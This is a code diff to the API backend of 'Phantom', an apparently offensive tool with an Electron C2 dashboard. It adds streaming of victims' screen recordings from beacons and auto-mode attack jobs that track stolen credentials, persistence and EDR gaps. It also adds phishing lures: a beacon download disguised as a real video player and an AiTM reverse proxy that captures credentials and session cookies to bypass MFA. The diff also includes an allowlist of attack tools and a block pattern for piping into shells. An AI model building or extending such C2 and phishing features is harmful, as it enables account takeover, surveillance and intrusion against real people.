@@ -7,9 +7,12 @@ Talks JSON to Electron, delegates to the existing Phantom modules.
 """
 
 import argparse
+import html
 import json
 import os
+import re
 import secrets
+import shlex
 import sys
 import uuid
 import time
@@ -196,7 +199,8 @@ async def c2_artifacts(_request: web.Request) -> web.Response:
     as JSON — the Electron C2 dashboard renders images from these."""
     from phantom.utils.paths import data_dir
     out = []
-    for subdir in ("screenshots", "downloads"):
+    for subdir in ("screenshots", "downloads", "remote", "recordings",
+                   "recordings/live"):
         d = os.path.join(data_dir(), subdir)
         if not os.path.isdir(d):
             continue
@@ -212,7 +216,8 @@ async def c2_artifacts(_request: web.Request) -> web.Response:
                 # too, not just the server add_result path (screenshots/)
                 low = name.lower()
                 kind = "image" if low.endswith((".bmp", ".png", ".jpg",
-                                                 ".jpeg", ".gif")) else "file"
+                                                 ".jpeg", ".gif")) else (
+                    "video" if low.endswith((".mp4", ".mkv", ".webm")) else "file")
                 out.append({
                     "name": name, "kind": kind, "dir": subdir,
                     "size": st.st_size,
@@ -226,25 +231,56 @@ async def c2_artifacts(_request: web.Request) -> web.Response:
 
 @routes.get("/api/c2/artifact")
 async def c2_artifact(request: web.Request) -> web.Response:
-    """Serve ONE artifact as base64 for image rendering in Electron.
-    Path-traversal safe: only data/screenshots/ + data/downloads/.
-    ?dir=screenshots|downloads &name=<file>"""
+    """Serve ONE artifact for Electron. Default: base64 JSON (images). With
+    ?raw=1: raw bytes with the right media type (videos go through this so
+    a <video> element can stream them).
+    Path-traversal safe: only the allowed data/ subdirs.
+    ?dir=screenshots|downloads|remote|recordings|recordings/live &name=<file>"""
     from phantom.utils.paths import data_dir
     subdir = request.query.get("dir", "screenshots")
     name = request.query.get("name", "")
-    if subdir not in ("screenshots", "downloads") or not name:
+    if subdir not in ("screenshots", "downloads", "remote", "recordings",
+                      "recordings/live") or not name:
         return _error("invalid artifact request", 400)
     safe = os.path.basename(name.replace("\\", "/"))
     path = os.path.join(data_dir(), subdir, safe)
     if not os.path.isfile(path):
         return _error("artifact not found", 404)
+    low = safe.lower()
+    media = ("image/bmp" if low.endswith((".bmp", ".dib")) else
+             "image/jpeg" if low.endswith((".jpg", ".jpeg")) else
+             "image/png" if low.endswith(".png") else
+             "video/mp4" if low.endswith(".mp4") else
+             "video/webm" if low.endswith(".webm") else
+             "application/octet-stream")
+    if request.query.get("raw") == "1":
+        with open(path, "rb") as fh:
+            return web.Response(body=fh.read(), content_type=media)
     import base64 as _b64
     with open(path, "rb") as fh:
         data = _b64.b64encode(fh.read()).decode()
-    media = "image/bmp" if safe.lower().endswith((".bmp", ".dib")) else \
-            "image/jpeg" if safe.lower().endswith((".jpg", ".jpeg")) else \
-            "image/png" if safe.lower().endswith(".png") else "application/octet-stream"
     return _json({"name": safe, "dir": subdir, "media": media, "data": data})
+
+
+@routes.get("/api/c2/recordings/live")
+async def c2_recordings_live(request: web.Request) -> web.Response:
+    """Progressive screen-stream status for a beacon: how many segments have
+    arrived, the growing mp4 (if ffmpeg muxed one), and the last segment
+    time. Electron's Recordings tab polls this for the live view."""
+    beacon_id = request.query.get("beacon_id", "")
+    if not beacon_id:
+        return _error("missing beacon_id", 400)
+    from phantom.utils.paths import data_dir
+    segs = c2_state.get_live_segments(beacon_id)
+    safe = "".join(c for c in beacon_id if c.isalnum())[:16] or "beacon"
+    mp4 = os.path.join(data_dir(), "recordings", "live", f"{safe}_live.mp4")
+    return _json({
+        "beacon_id": beacon_id,
+        "segments": segs,
+        "count": len(segs),
+        "mp4": os.path.basename(mp4) if os.path.isfile(mp4) else "",
+        "last": segs[-1]["time"] if segs else "",
+    })
 
 
 # ── C2 State ───────────────────────────────────────────────────────────────
@@ -331,7 +367,26 @@ async def c2_config_mtls_toggle(_request: web.Request) -> web.Response:
 
 @routes.get("/api/session")
 async def session_get(_request: web.Request) -> web.Response:
-    """Return current session state."""
+    """Return current session state.
+
+    `knowledge` carries the bridged facts the auto-mode writes into the
+    manual session (services/creds/OS, internal peers, cloud, EDR gaps,
+    mobile surfaces), so the Electron panels show the same truth as the CLI
+    without shipping the whole knowledge_base blob.
+    """
+    kb = session.knowledge_base or {}
+    knowledge = {
+        "services": kb.get("services") or [],
+        "os_info": kb.get("os_info") or {},
+        "creds_found": kb.get("creds_found") or [],
+        "next_targets": kb.get("next_targets") or [],
+        "beacon_deployed": bool(kb.get("beacon_deployed")),
+        "persistence_set": bool(kb.get("persistence_set")),
+        "cloud_findings": kb.get("cloud_findings") or {},
+        "edr_gaps": kb.get("edr_gaps") or [],
+        "mobile_surface": kb.get("mobile_surface") or {},
+        "k8s_escape": bool(kb.get("k8s_escape")),
+    }
     return _json({
         "target": session.target or "",
         "scope": session.scope or [],
@@ -341,6 +396,7 @@ async def session_get(_request: web.Request) -> web.Response:
         "notes": session.notes or [],
         "results": session.results or {},
         "history": session.history or [],
+        "knowledge": knowledge,
     })
 
 
@@ -501,45 +557,168 @@ async def session_profile_load(request: web.Request) -> web.Response:
     return _json({"status": "loaded", "name": name, "target": session.target})
 
 
-# ── Auto-Mode ──────────────────────────────────────────────────────────────
+# ── Learning engine (experience memory) ─────────────────────────────────────
+# The case-based memory is the one part of Phantom that IMPROVES with use:
+# it records (situation, technique, outcome, cause, repair) and reorders
+# already-allowed moves so a wall hit before is not hit the same way again.
+# These endpoints let the desktop app show what was learned, why, and let
+# the operator forget it deliberately.
 
-_auto_stream: list[dict] = []          # threaded stream buffer
-_auto_current_step = -1
-_auto_done = False
-_auto_lock = threading.Lock()
 
-def _auto_stream_callback(kind: str, data: dict) -> None:
-    """Capture auto-mode events into the stream buffer."""
-    with _auto_lock:
-        _auto_stream.append({"kind": kind, "data": data})
+def _experience_store():
+    from phantom.automation.brain.experience import CaseStore
+    return CaseStore(enabled=True)          # global store (on disk)
+
+
+@routes.get("/api/learning")
+async def learning_get(_request: web.Request) -> web.Response:
+    """Current state of the learning memory (survives across engagements)."""
+    try:
+        store = _experience_store()
+        stats = store.stats()
+        recent = sorted(store.episodes, key=lambda e: e.ts)[-40:]
+        from phantom.automation.brain.experience import consolidate
+        return _json({
+            "stats": stats,
+            "patterns": consolidate.pattern_table(store.episodes,
+                                                  min_n=2),
+            "causes": consolidate.cause_profile(store.episodes),
+            "recent": [e.to_dict() for e in reversed(recent)],
+            "labels": _cause_labels(),
+        })
+    except Exception as exc:
+        return _json({"stats": {"episodes": 0, "enabled": False},
+                      "recent": [], "error": str(exc)})
+
+
+@routes.post("/api/learning/reset")
+async def learning_reset(_request: web.Request) -> web.Response:
+    """Forget the cross-engagement memory (deliberate, irreversible)."""
+    try:
+        store = _experience_store()
+        store.clear()
+        return _json({"status": "cleared", "episodes": 0})
+    except Exception as exc:
+        return _error(f"reset failed: {exc}")
+
+
+def _cause_labels() -> dict:
+    try:
+        from phantom.automation.brain.experience import causes
+        return dict(causes.CAUSE_LABEL)
+    except Exception:
+        return {}
+
+
+# ── Auto-Mode (job manager: per-run state, cooperative stop) ──────────────
+# The old module globals (_auto_stream/_auto_current_step/_auto_done) made
+# every run share ONE buffer: a second run reset the first one's stream
+# mid-flight and "stop" only flipped a bool the agent never read. Each run
+# is now a job with its OWN stream buffer and a stop Event the agent checks
+# between planner iterations (cooperative: a scan already in flight
+# finishes, the loop exits at the next boundary).
+
+_auto_lock = threading.Lock()   # guards every job's stream buffer
+
+
+class AutoJob:
+    """One auto-mode run: dedicated stream, stop signal, lifecycle."""
+
+    def __init__(self, job_id: str, targets: list, mode: str,
+                 profile: str, goal: str) -> None:
+        self.id = job_id
+        self.verbose = False
+        self.targets = list(targets)
+        self.mode = mode
+        self.profile = profile
+        self.goal = goal
+        self.stream: list[dict] = []
+        self.current_step = -1
+        self.done = False
+        self.stop_event = threading.Event()
+        self.thread: Optional[threading.Thread] = None
+        self.started_at = time.time()
+        self.error: Optional[str] = None
+
+    def callback(self, kind: str, data: dict) -> None:
+        with _auto_lock:
+            self.stream.append({"kind": kind, "data": data})
+
+    def drain(self) -> list[dict]:
+        with _auto_lock:
+            events = self.stream[:]
+            self.stream.clear()
+        return events
+
+
+class AutoJobManager:
+    """Registry of auto-mode runs. One ACTIVE run at a time (a new run
+    replaces it), finished runs are kept briefly for status queries and
+    pruned after an hour so the process never accumulates state."""
+
+    def __init__(self) -> None:
+        self._lock = threading.Lock()
+        self._jobs: dict[str, AutoJob] = {}
+        self._active_id: Optional[str] = None
+
+    def create(self, targets: list, mode: str, profile: str,
+               goal: str, verbose: bool = False) -> AutoJob:
+        with self._lock:
+            job = AutoJob(f"job_{uuid.uuid4().hex[:8]}", targets, mode,
+                          profile, goal)
+            job.verbose = verbose
+            self._jobs[job.id] = job
+            self._active_id = job.id
+            self._prune_locked()
+            return job
+
+    def active(self) -> Optional[AutoJob]:
+        with self._lock:
+            if self._active_id:
+                return self._jobs.get(self._active_id)
+            return None
+
+    def stop_active(self) -> Optional[AutoJob]:
+        """Request a cooperative stop: set the Event (the agent's drive loop
+        observes it at the next iteration boundary and halts)."""
+        with self._lock:
+            job = self._jobs.get(self._active_id) if self._active_id else None
+            if job and not job.done:
+                job.stop_event.set()
+                return job
+            return None
+
+    def _prune_locked(self) -> None:
+        now = time.time()
+        for jid in [j for j, jb in self._jobs.items()
+                    if jb.done and now - jb.started_at > 3600]:
+            self._jobs.pop(jid, None)
+
+
+auto_jobs = AutoJobManager()
 
 
 @routes.post("/api/automode/run")
 async def automode_run(request: web.Request) -> web.Response:
-    """Start the auto-mode engine."""
-    global _auto_done, _auto_stream
+    """Start the auto-mode engine as a managed job."""
     body = await request.json() or {}
-    targets = body.get("targets", [])
+    targets = [str(t).strip() for t in body.get("targets", []) if str(t).strip()]
     mode = body.get("mode", "default")
     profile = body.get("profile", "enterprise")
     goal = body.get("goal", "deliver")
     agents = body.get("agents", 0)
     resume = body.get("resume", "")
     llm = bool(body.get("llm", False))
+    experience = bool(body.get("experience", False))
+    verbose = bool(body.get("verbose", False))
 
     if not targets:
         return _error("No targets specified")
 
-    with _auto_lock:
-        _auto_stream = []
-        _auto_current_step = -1
-        _auto_done = False
+    job = auto_jobs.create(targets, mode, profile, goal, verbose=verbose)
+    session.target = targets[0]
 
-    if targets:
-        session.target = targets[0]
-
-    def _run():
-        global _auto_done
+    def _run(job: AutoJob) -> None:
         try:
             run_auto_mode(
                 targets=targets,
@@ -547,14 +726,16 @@ async def automode_run(request: web.Request) -> web.Response:
                 stealth=(mode == "stealth"),
                 speed=(mode == "speed"),
                 plan=False,
-                verbose=True,
+                verbose=verbose,
                 agents=agents,
                 goal=goal,
                 profile=profile,
-                on_event=_auto_stream_callback,
+                on_event=job.callback,
                 handoff_c2=False,
                 llm=llm,
+                experience=experience,
                 resume=resume,
+                stop_event=job.stop_event,
             )
         except Exception as exc:
             # Never die silently: surface the crash in the UI stream. A
@@ -562,25 +743,28 @@ async def automode_run(request: web.Request) -> web.Response:
             # used to kill this thread before any event was emitted,
             # leaving the UI with just "sequence complete".
             traceback.print_exc()
-            with _auto_lock:
-                _auto_stream.append({"kind": "failed", "data": {
-                    "output": f"auto-mode crashed: {exc}"}})
+            job.error = str(exc)
+            job.callback("failed", {"output": f"auto-mode crashed: {exc}"})
         finally:
-            _auto_done = True
-            with _auto_lock:
-                _auto_stream.append({"kind": "halt", "data": {"reason": "sequence complete"}})
+            job.done = True
+            job.callback("halt", {"reason": (
+                "stopped by operator" if job.stop_event.is_set()
+                else "sequence complete")})
 
-    threading.Thread(target=_run, daemon=True).start()
-    return _json({"status": "started", "targets": targets, "mode": mode})
+    job.thread = threading.Thread(target=_run, args=(job,), daemon=True)
+    job.thread.start()
+    return _json({"status": "started", "job_id": job.id,
+                  "targets": targets, "mode": mode})
 
 
 @routes.get("/api/automode/stream")
 async def automode_stream(_request: web.Request) -> web.Response:
-    """Poll for live auto-mode events."""
-    global _auto_current_step
-    with _auto_lock:
-        events = _auto_stream[:]
-        _auto_stream.clear()
+    """Poll for live auto-mode events of the ACTIVE job."""
+    job = auto_jobs.active()
+    if job is None:
+        return _json({"done": True, "step_updates": [], "current_step": -1,
+                      "log": []})
+    events = job.drain()
 
     step_updates = []
     logs = []
@@ -606,23 +790,33 @@ async def automode_stream(_request: web.Request) -> web.Response:
                     step_updates.append({"step": idx, "status": "running", "detail": cap[:40]})
                     break
             if matched_step is not None:
-                _auto_current_step = matched_step
+                job.current_step = matched_step
+            # the log carries the REAL command + the planner's WHY + the
+            # stealth badge so the UI renders the action, not just its name
             logs.append({
                 "time": datetime.now().strftime("%H:%M:%S"),
                 "text": f"[▶] Running: {data.get('banner') or data.get('capability')}",
                 "level": "info",
+                "command": data.get("command") or "",
+                "reason": data.get("reason") or "",
+                "stealth": data.get("stealth_level") or "",
             })
         elif kind == "found":
             findings = data.get("findings", [])
             for key, idx in step_map.items():
                 if key in cap:
                     step_updates.append({"step": idx, "status": "done", "detail": ", ".join(findings[:3])})
-                    _auto_current_step = idx
+                    job.current_step = idx
                     break
             # human-readable value dump: each finding key carries its value
             # (service:tcp/445 = microsoft-ds, os:detected = Windows ...) so
-            # the operator sees WHAT was found, not just fact names
-            values = data.get("values") or {}
+            # the operator sees WHAT was found, not just fact names.
+            # Credential findings are REDACTED here: the UI stream and the
+            # persisted session mirror must never carry raw passwords/OTPs
+            # (the WorldModel keeps them for the kill chain; the operator's
+            # raw report is the only surface that shows the real values).
+            from phantom.utils.redact import redact as _redact_values
+            values = _redact_values(data.get("values") or {})
             parts = []
             for fkey in findings[:6]:
                 v = values.get(fkey)
@@ -638,9 +832,12 @@ async def automode_stream(_request: web.Request) -> web.Response:
         elif kind == "failed":
             for key, idx in step_map.items():
                 if key in cap:
-                    step_updates.append({"step": idx, "status": "failed", "detail": data.get("output", "")[:60]})
+                    step_updates.append({"step": idx, "status": "failed",
+                                         "detail": (data.get("reason")
+                                                    or data.get("output")
+                                                    or "execution failed")[:60]})
                     break
-            reason = (data.get("output", "") or "").strip()
+            reason = (data.get("reason") or data.get("output") or "").strip()
             logs.append({
                 "time": datetime.now().strftime("%H:%M:%S"),
                 "text": f"[ERROR] Failed: {cap} — {reason[:120]}" if reason
@@ -676,6 +873,8 @@ async def automode_stream(_request: web.Request) -> web.Response:
                 "level": "warn",
             })
         elif kind == "hunt_probe":
+            if not job.verbose:
+                continue
             # behavioural hunt probe lines: endpoint + signals, trimmed
             req = data.get("request", {})
             logs.append({
@@ -692,7 +891,7 @@ async def automode_stream(_request: web.Request) -> web.Response:
             })
         elif kind == "beacon_up":
             step_updates.append({"step": 6, "status": "done", "detail": data.get("beacon_id", "")})
-            _auto_current_step = 6
+            job.current_step = 6
             logs.append({
                 "time": datetime.now().strftime("%H:%M:%S"),
                 "text": f"[★] BEACON UP: {data.get('beacon_id', '')}",
@@ -712,10 +911,13 @@ async def automode_stream(_request: web.Request) -> web.Response:
                 "level": "info",
             })
         elif kind == "inference":
+            if not job.verbose:
+                continue
             # render the DEDUCED findings with their values — the operator
             # must see WHAT was learned ("os: Windows Server 2019", not just
-            # "inference")
-            fins = data.get("findings") or []
+            # "inference"); secret values are redacted for the UI stream
+            from phantom.utils.redact import redact as _redact_values
+            fins = _redact_values(data.get("findings") or [])
             if fins:
                 parts = []
                 for f in fins[:4]:
@@ -732,6 +934,8 @@ async def automode_stream(_request: web.Request) -> web.Response:
                     "level": "dim",
                 })
         elif kind == "reason":
+            if not job.verbose:
+                continue
             hyps = data.get("hypotheses") or []
             if hyps:
                 shown = "; ".join(
@@ -755,9 +959,9 @@ async def automode_stream(_request: web.Request) -> web.Response:
                 })
 
     return _json({
-        "done": _auto_done,
+        "done": job.done,
         "step_updates": step_updates,
-        "current_step": _auto_current_step,
+        "current_step": job.current_step,
         "log": logs,
     })
 
@@ -765,20 +969,25 @@ async def automode_stream(_request: web.Request) -> web.Response:
 @routes.get("/api/automode/status")
 async def automode_status(_request: web.Request) -> web.Response:
     """Current auto-mode state without consuming the event stream."""
+    job = auto_jobs.active()
+    if job is None:
+        return _json({"running": False, "current_step": -1, "job_id": None})
     return _json({
-        "running": not _auto_done,
-        "current_step": _auto_current_step,
+        "running": not job.done,
+        "current_step": job.current_step,
+        "job_id": job.id,
     })
 
 
 @routes.post("/api/automode/stop")
 async def automode_stop(_request: web.Request) -> web.Response:
-    """Stop a running auto-mode session."""
-    global _auto_done
-    _auto_done = True
-    with _auto_lock:
-        _auto_stream.append({"kind": "halt", "data": {"reason": "stopped by user"}})
-    return _json({"status": "stopped"})
+    """Request a cooperative stop of the active auto-mode run. The agent
+    observes the event at the next iteration boundary and halts; a long
+    scan already in flight finishes first (never killed mid-action)."""
+    job = auto_jobs.stop_active()
+    if job is None:
+        return _json({"status": "stopped", "note": "no active run"})
+    return _json({"status": "stopped", "job_id": job.id})
 
 
 @routes.post("/api/automode/plan")
@@ -871,6 +1080,151 @@ def _module_groups(instance, method: str) -> dict[str, list[str]]:
             for key, commands in (value or {}).items()}
 
 
+# ── Command allowlist (API execution gate) ─────────────────────────────────
+# The module endpoints execute shell commands in the operator backend. The
+# frontend is NOT a security boundary: a request body can carry anything, so
+# every command is validated against the set of leading binaries the modules
+# themselves generate (extracted at import time) plus a curated global tool
+# set. Phantom-internal shell commands (do_* methods like `fire`, `run`,
+# `deploy-agent`, `ssh [user:pass]`) are NOT backend-executable: they run in
+# the CLI shell, and the API rejects them with a clear message instead of
+# handing them to the OS (where "run" would just fail or worse).
+
+_GLOBAL_TOOLS = {
+    # core recon / discovery
+    "nmap", "masscan", "nc", "ncat", "netcat", "traceroute", "arp-scan",
+    "ping", "fping", "arp", "nbtscan", "wakeonlan", "arping",
+    # service enumeration
+    "sslscan", "openssl", "smbclient", "enum4linux", "enum4linux-ng",
+    "rpcclient", "snmpwalk", "snmpbulkwalk", "onesixtyone", "smbmap",
+    "ike-scan", "crackmapexec", "netexec", "evil-winrm", "rdesktop",
+    "ldapsearch", "wbinfo",
+    # web
+    "curl", "wget", "whatweb", "wafw00f", "nuclei", "gobuster",
+    "feroxbuster", "dirb", "nikto", "wfuzz", "ffuf", "wpscan",
+    "dnsrecon", "sublist3r", "amass", "httpx", "hakrawler", "katana",
+    "jsbeautifier", "xsstrike", "arjun",
+    # dns
+    "dig", "host", "nslookup", "whois", "dnsenum", "fierce",
+    # creds / brute force
+    "hydra", "medusa", "patator", "john", "hashcat", "cewl", "crunch",
+    "sshpass", "ssh", "scp", "wpscan",
+    # osint
+    "theHarvester", "sherlock", "shodan", "exiftool", "steghide",
+    "binwalk", "strings", "file", "unzip", "tar", "7z", "rar",
+    "gzip", "zip", "base64",
+    # exploit frameworks / tools
+    "msfconsole", "msfvenom", "searchsploit", "sqlmap", "responder",
+    "impacket-secretsdump", "secretsdump.py", "impacket-GetNPUsers",
+    "GetNPUsers.py", "impacket-GetUserSPNs", "GetUserSPNs.py",
+    "impacket-psexec", "psexec.py", "impacket-smbexec", "smbexec.py",
+    "impacket-wmiexec", "wmiexec.py", "impacket-ntlmrelayx",
+    "ntlmrelayx.py", "impacket-mssqlclient", "mssqlclient.py",
+    "kerbrute", "bloodhound-python", "bloodhound", "cyberchef",
+    # wifi
+    "airmon-ng", "airodump-ng", "aireplay-ng", "reaver", "wash",
+    "wifite", "bully",
+    # pivot / tunneling / shells
+    "proxychains", "proxychains4", "socat", "chisel", "sshuttle",
+    "nc.traditional", "busybox",
+    # generic utilities (interpreters are intentionally EXCLUDED: a leading
+    # `bash`/`python` would be arbitrary code execution, not a module action)
+    "git", "ls", "cat", "grep", "sed", "awk", "sort", "uniq", "head",
+    "tail", "wc", "date", "id", "hostname", "uname", "whoami", "ps",
+    "kill",
+}
+
+_MODULE_INTERNAL: dict[str, set[str]] = {}
+_MODULE_TOOLS: dict[str, set[str]] = {}
+_ALLOWED_TOOLS: set[str] = set(_GLOBAL_TOOLS)
+
+
+def _strip_comment(cmd: str) -> str:
+    """Module commands carry `  # reason` comments — drop them before
+    parsing so the comment never becomes part of the token stream."""
+    return re.sub(r"\s+#.*$", "", cmd).strip()
+
+
+def _leading_token(cmd: str) -> str:
+    """First binary of a shell command, `sudo` peeled off:
+    'sudo nmap -sV {t}' -> 'nmap'; 'msfconsole -q -x "..."' -> 'msfconsole'."""
+    try:
+        tokens = shlex.split(_strip_comment(cmd))
+    except ValueError:
+        # unbalanced quotes: not a valid shell command, refuse it
+        return ""
+    if not tokens:
+        return ""
+    tok = tokens[0]
+    if tok == "sudo" and len(tokens) > 1:
+        tok = tokens[1]
+    return tok
+
+
+def _build_allowlists() -> None:
+    """Extract per-module internal commands (do_*) and leading binaries from
+    the same command groups the frontend receives, so anything the UI can
+    legitimately send is allowed and everything else is refused."""
+    global _ALLOWED_TOOLS
+    for name in _MODULES:
+        instance = _module_instance(name)
+        internal = {m[3:] for m in dir(instance)
+                    if m.startswith("do_") and m != "do_"}
+        _MODULE_INTERNAL[name] = internal
+        tools: set[str] = set()
+        for group, cmds in {**_module_groups(instance, "build_commands"),
+                            **_module_groups(instance, "suggest_commands")}.items():
+            for c in cmds:
+                tok = _leading_token(c)
+                if not tok:
+                    continue
+                # Phantom pseudo-commands advertised in the module panels
+                # ("run", "fire <cve>", "deploy-agent"...) are NOT shell
+                # binaries: keep them out of the tool set so they cannot be
+                # mistaken for a real executable by the validation gate.
+                if tok.replace("-", "_") in internal:
+                    continue
+                tools.add(tok)
+        _MODULE_TOOLS[name] = tools
+        _ALLOWED_TOOLS |= tools
+
+
+_build_allowlists()
+
+
+def _validate_backend_command(module: Optional[str],
+                              command: str) -> Optional[str]:
+    """Return an error string when the command must NOT execute, else None.
+    module=None applies the GLOBAL allowlist only (generic /api/backend/run)."""
+    cmd = (command or "").strip()
+    if not cmd:
+        return "empty command"
+    # `curl ... | sh` / `... | python -` is arbitrary code execution even
+    # when the leading binary is allowlisted — reject pipes into
+    # interpreters outright (modules never generate those).
+    if re.search(r"\|\s*(?:sh|bash|zsh|dash|python|python3|perl|ruby|node|php)\b",
+                 cmd):
+        return ("command pipes into an interpreter (arbitrary execution) "
+                "— not allowed")
+    tok = _leading_token(cmd)
+    if not tok:
+        return "unparseable command (check quotes)"
+    if module is not None:
+        # 1) real shell binaries win (a do_* method may share its name with
+        #    a tool the module also invokes as a command, e.g. whatweb)
+        if tok in _MODULE_TOOLS.get(module, set()) or tok in _ALLOWED_TOOLS:
+            return None
+        internal = _MODULE_INTERNAL.get(module, set())
+        if tok in internal or tok.replace("-", "_") in internal:
+            return (f"'{tok}' is a Phantom shell command (CLI-only) — run it "
+                    f"in the Phantom shell with 'use {module}', not through "
+                    f"the API backend")
+        return f"command '{tok}' is not allowed for module '{module}'"
+    if tok in _ALLOWED_TOOLS:
+        return None
+    return f"command '{tok}' is not in the API allowlist"
+
+
 @routes.get("/api/modules")
 async def modules_list(_request: web.Request) -> web.Response:
     """Return module metadata and live state-aware commands."""
@@ -905,6 +1259,9 @@ async def module_run(request: web.Request) -> web.Response:
     command = str(body.get("command", "")).strip()
     if not command:
         return _error("Missing command")
+    gate = _validate_backend_command(name, command)
+    if gate:
+        return _error(gate, 403)
     result = backend_dispatcher.run(command, str(body.get("target", session.target or "")),
                                     max(1.0, min(float(body.get("timeout", 120)), 3600.0)))
     return _json({"module": name, "command": result.cmd, "stdout": result.stdout,
@@ -931,6 +1288,10 @@ async def module_run_group(request: web.Request) -> web.Response:
     commands = [c for c in commands if c]
     if not commands:
         return _error("Missing 'commands' list")
+    for c in commands:
+        gate = _validate_backend_command(name, c)
+        if gate:
+            return _error(gate, 403)
     target = str(body.get("target", session.target or ""))
     timeout = max(1.0, min(float(body.get("timeout", 300)), 7200.0))
 
@@ -1030,7 +1391,11 @@ Technical details are available in the raw audit report.
 END OF CLIENT REPORT
 """
 
-    report_dir = os.path.join(sessions_dir(), f"report_{target}_{int(time.time())}")
+    # the target may contain path-hostile characters (<script>, :/\ ...):
+    # sanitize it before it becomes part of a filesystem path
+    target_safe = re.sub(r"[^A-Za-z0-9._-]", "_", target)
+    report_dir = os.path.join(
+        sessions_dir(), f"report_{target_safe}_{int(time.time())}")
     os.makedirs(report_dir, exist_ok=True)
 
     if fmt == "json":
@@ -1044,14 +1409,16 @@ END OF CLIENT REPORT
         ext = "html" if fmt == "html" else "txt"
         raw_path = os.path.join(report_dir, f"raw_audit.{ext}")
         client_path = os.path.join(report_dir, f"client_report.{ext}")
-        with open(raw_path, "w") as f:
+        with open(raw_path, "w", encoding="utf-8") as f:
             if fmt == "html":
-                f.write(f"<html><body><pre>{raw}</pre></body></html>")
+                # escape the report body: raw findings/history can contain
+                # angle brackets from target data (HTML injection)
+                f.write(f"<html><body><pre>{html.escape(raw)}</pre></body></html>")
             else:
                 f.write(raw)
-        with open(client_path, "w") as f:
+        with open(client_path, "w", encoding="utf-8") as f:
             if fmt == "html":
-                f.write(f"<html><body><pre>{client}</pre></body></html>")
+                f.write(f"<html><body><pre>{html.escape(client)}</pre></body></html>")
             else:
                 f.write(client)
 
@@ -1128,6 +1495,9 @@ async def backend_run(request: web.Request) -> web.Response:
     timeout = max(1.0, min(float(body.get("timeout", 120)), 3600.0))
     if not command:
         return _error("Missing command")
+    gate = _validate_backend_command(None, command)
+    if gate:
+        return _error(gate, 403)
     result = backend_dispatcher.run(command, target, timeout)
     return _json({"command": result.cmd, "stdout": result.stdout,
                   "stderr": result.stderr, "combined": result.combined,
@@ -1135,18 +1505,28 @@ async def backend_run(request: web.Request) -> web.Response:
                   "error": result.error, "duration": result.duration})
 
 
-# ── Craft lures (IP grabbers / pixels / QR / beacon delivery) ───────────────
+# ── Craft lures (IP grabbers / pixels / AiTM relay / beacon delivery) ───────
 
 @routes.post("/api/craft")
 async def craft_lure(request: web.Request) -> web.Response:
     """Build a social lure and return it ready to paste.
-    body: {type: ipgrab|reel|image|pixel|video|beacon, arg?, label?, platform?}
+    body: {type: ipgrab|reel|image|pixel|video|beacon|beacon-player|real,
+           arg?, label?, platform?, skin?, inner?}
       ipgrab          plain click-tracking link
       reel  arg=<url|search-term>   video lure on a REAL video you pick
       image arg=<file|url>          zero-click image lure (IP on render)
       pixel           1x1 tracking pixel
       video           share-format video lure (engine/API use)
       beacon          one-click beacon link disguised as a reel URL
+      beacon-player   upgraded: reel page plays a REAL video, play click
+                      downloads the beacon (fail-soft, no C2 exposure)
+      real  arg=<real-url> inner=<ipgrab|reel|beacon-player>   REAL first
+                      hop: a genuine YouTube/Drive/Notion URL goes in the
+                      message, the capture link goes INSIDE that content
+      aitm  arg=<real-login-url>    ENTERPRISE (opt-in): reverse proxy that
+                      serves the REAL login page and captures credentials
+                      AND the session cookies the provider issues (beats
+                      plain MFA). Needs phishing.aitm=true + a domain w/ TLS
     """
     body = await request.json() or {}
     lure_type = str(body.get("type", "")).lower()
@@ -1172,7 +1552,20 @@ async def craft_lure(request: web.Request) -> web.Response:
         elif lure_type == "pixel":
             out = craft_mod.craft_pixel(label=str(body.get("label", "px")))
         elif lure_type == "beacon":
-            out = craft_mod.craft_beacon(platform=str(body.get("platform", "android")))
+            out = craft_mod.craft_beacon(platform=str(body.get("platform", "auto")))
+        elif lure_type == "beacon-player":
+            out = craft_mod.craft_beacon_player(
+                platform=str(body.get("platform", "auto")),
+                skin=str(body.get("skin", "instagram")))
+        elif lure_type == "real":
+            out = craft_mod.craft_real(
+                outer_url=str(body.get("arg", "")),
+                inner=str(body.get("inner", "ipgrab")),
+                label=str(body.get("label", "real")))
+        elif lure_type == "aitm":
+            out = craft_mod.craft_aitm(
+                upstream=str(body.get("arg", "")),
+                code=str(body.get("code", "")))
         else:
             return _error(f"Unknown craft type: {lure_type}")
         if "error" in out:
@@ -1191,6 +1584,19 @@ async def craft_hits_get(request: web.Request) -> web.Response:
     try:
         from phantom.modules import craft as craft_mod
         return _json(craft_mod.craft_hits(code))
+    except Exception as e:
+        return _error(str(e))
+
+
+@routes.get("/api/craft/sessions")
+async def craft_sessions_get(request: web.Request) -> web.Response:
+    """Sessions captured by an AiTM mount (?code=...)."""
+    code = request.query.get("code", "")
+    if not code:
+        return _error("Missing code")
+    try:
+        from phantom.modules import craft as craft_mod
+        return _json(craft_mod.craft_sessions(code))
     except Exception as e:
         return _error(str(e))
 
@@ -1244,6 +1650,31 @@ async def network_vulnerable(request: web.Request) -> web.Response:
                       "reason": res.get("reason", "")})
     except Exception as e:
         return _error(f"exposure scan failed: {e}")
+
+
+@routes.post("/api/network/liveness")
+async def network_liveness(_request: web.Request) -> web.Response:
+    """Probe which discovered devices are CURRENTLY alive (parallel ping,
+    bounded) and refresh the device store + WorldModel so the map can
+    render dead hosts faded and live hosts with the red-dot badge.
+    """
+    try:
+        from phantom.core.netmap import (
+            check_hosts_alive, load_discovered_hosts, save_discovered_hosts,
+            seed_worldmodel)
+        import asyncio
+        loop = asyncio.get_event_loop()
+        hosts = load_discovered_hosts()
+        if not hosts:
+            return _json({"status": {}, "checked": 0})
+        status = await loop.run_in_executor(None, check_hosts_alive, hosts,
+                                            8.0, True)
+        # persist the refreshed alive/last_seen so the map + planner agree
+        save_discovered_hosts(hosts)
+        seed_worldmodel(hosts, source="netmap")
+        return _json({"status": status, "checked": len(status)})
+    except Exception as e:
+        return _error(f"liveness probe failed: {e}")
 
 
 # ── Tool install (Electron preflight / CLI) ─────────────────────────────────
@@ -1654,6 +2085,89 @@ async def session_list(_request: web.Request) -> web.Response:
     return _json({"sessions": saved})
 
 
+# ── Portable .pm bundles ────────────────────────────────────────────────────
+
+def _pm_dir() -> str:
+    from phantom.utils.paths import sessions_dir
+    return sessions_dir()
+
+
+@routes.get("/api/pm/list")
+async def pm_list(_request: web.Request) -> web.Response:
+    """List the .pm engagement bundles on this machine (name, size, mtime,
+    target) — the Electron Sessions tab renders these."""
+    from phantom.utils.paths import sessions_dir
+    out = []
+    try:
+        d = sessions_dir()
+        for name in sorted(os.listdir(d)):
